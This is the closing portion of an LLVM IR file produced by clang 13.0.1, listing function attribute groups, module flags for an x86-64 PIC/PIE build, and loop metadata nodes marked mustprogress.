attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nofree nosync nounwind willreturn }
attributes #7 = { argmemonly nofree nounwind willreturn }
attributes #8 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { nounwind }
attributes #12 = { nounwind readonly willreturn }
attributes #13 = { noreturn }
attributes #14 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
